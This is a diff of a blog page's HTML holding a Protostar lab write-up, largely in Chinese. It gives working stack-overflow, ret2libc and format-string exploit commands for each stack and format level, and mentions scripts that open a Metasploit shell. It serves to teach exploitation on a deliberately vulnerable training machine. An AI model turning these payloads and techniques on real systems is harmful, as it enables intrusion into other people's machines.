@@ -115,7 +115,7 @@
 
         <span itemprop="articleBody"><h4 id="0xff-about-protostar">0xff About Protostar</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Protostar introduces the following in a friendly way:
+<div class="highlighter-rouge"><pre class="highlight"><code>Protostar introduces the following in a friendly way:
 
 Network programming
 Byte order
@@ -123,55 +123,61 @@ Handling sockets
 Stack overflows
 Format strings
 Heap overflows
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p>The above is introduced in a simple way, starting with simple memory corruption and modification, function redirection, and finally executing custom shellcode.</p>
 
 <p>In order to make this as easy as possible to introduce Address Space Layout Randomisation and Non-Executable memory has been disabled. If you are interested in covering ASLR and NX memory, please see the Fusion page.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>official website:       https://exploit-exercises.com/protostar
+<div class="highlighter-rouge"><pre class="highlight"><code>official website:       https://exploit-exercises.com/protostar
 nebula.iso download:    https://pan.baidu.com/s/1nvq3f5J
 some witeup:    
     https://lightless.me/archives/protostar-stack-writeup.html
     https://bug.cool/2016/Protostar_Writeup/
     https://lightless.me/archives/protostar-format-writeup.html
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="0x00-stack0">0x00 stack0</h4>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
     cd /opt/protostar/bin
     objdump -d -M intel stack0 &gt; /tmp/stack0.out
     vi stack0.out
 link knowledge:
     https://blog.163.com/lixiangqiu_9202/blog/static/535750372012727102618226/
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="0x01-stack1">0x01 stack1</h4>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
     python -c "print 'A'*64+'\x64\x63\x62\x61'" | xargs ./stack1
 link knowledge:
     the command:
         python -c "print 'A'*64+'\x64\x63\x62\x61'" | ./stack1 
     will not work,coz this protostar is different from the first nebula system
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="0x02-stack2">0x02 stack2</h4>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
     export GREENIE=`python -c "print 'A'*64+'\x0a\x0d\x0a\x0d'"`
     ./stack2
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="0x03-stack3">0x03 stack3</h4>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
     gdb ./stack3
     b win
     output:breakpoint 1 at 0x804842a...
     quit
     python -c "print 'A'*64+'\x2a\x84\x04\x08'" | ./stack3
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="0x04-stack4">0x04 stack4</h4>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
     gdb ./stack4
     disas win
         查得win函数的地址为080483f4
@@ -190,10 +196,11 @@ link knowledge:
     :%!xxd -r(保存作用)
     gdb ./stack4
     r &lt; /tmp/stack4
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="0x05-stack5">0x05 stack5</h4>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
     su
     godmode
     vi /proc/sys/fs/suid_dumpable
@@ -256,10 +263,11 @@ link knowledge:
     ----------------end----------------
     python stack5.py
     msf receive a shell from protostar
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="0x06-stack6">0x06 stack6</h4>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
     构造如下链:
     'A'*80+system_addr+exit_addr+command_addr+command(='/bin/sh\x00')
     gdb stack6
@@ -292,10 +300,11 @@ link knowledge:
     vi /tmp/succeed.txt
     output:succeed
     此时已经成功写文件,奇怪!居然只有在gdb调试的时候用finish才会成功执行,而不用上面的gdb的过程无法成功执行命令
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="0x07-stack7">0x07 stack7</h4>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
     形如0xbxxxxxxx或0xfxxxxxxx的地址(system等系统函数地址)不可使用
     objdump -d stack7
     find .text has someplace with:
@@ -380,17 +389,19 @@ link knowledge:
     rm stack7.txt
     python stack7.py
     msf receive a shell connect from protostar
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="0x07-format0">0x07 format0</h4>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
     ./format0 `python -c "print 'A'*64+'\xef\xbe\xad\xde'"`
     但是题目要求输入为10字节以内,so
     ./format0 `python -c "print '%64d' + '\xef\xbe\xad\xde'"`
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="0x08-format1">0x08 format1</h4>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
     objdump -t format1
     find target address:0x8049638
     ./format1 `python -c "print 'AAAABBBB'+'%x.%x'"`
@@ -416,10 +427,11 @@ link knowledge:
     ./format1 `python -c "print 'AA\x38\x96\x04\x08BB'+'%x.'*131+'%n.'+'%x.'*8"`
     output:
     .....you have modified the target :)
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="0x09-format2">0x09 format2</h4>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
     objdump -t format2
     find target address:80496e4
     python -c "print '%x.'*2" | ./format2
@@ -438,10 +450,11 @@ link knowledge:
     python -c "print '\xe4\x96\x04\x08BBBB%56x'+'%4\$n'" | ./format2
     output:
     you have modified the target :)
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="0xa-format3">0xA format3</h4>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
     objdump -t format3
     find target address:80496f4
     python -c "print 'AAAABBBB'+'%x.'*2" | ./format3
@@ -460,10 +473,11 @@ link knowledge:
     python -c "print '\xf4\x96\x04\x08BBBB%16930108x'+'%12\$n'" | ./format
     output:
     ...you have modified the target:)
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="0xb-format4">0xB format4</h4>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
     gdb查找函数hello的地址(gdb找函数地址好像是不会变的,动态调试中的参数变量似乎会改变)
     gdb format4
     disas hello
@@ -493,7 +507,8 @@ link knowledge:
     python -c "print '\x24\x97\x04\x08BBBB%134513836x'+'%4\$n.'" | ./format4
     output:
     ...code execution redirected! you win
-</code></pre></div></div>
+</code></pre>
+</div>
 
 </span>
 
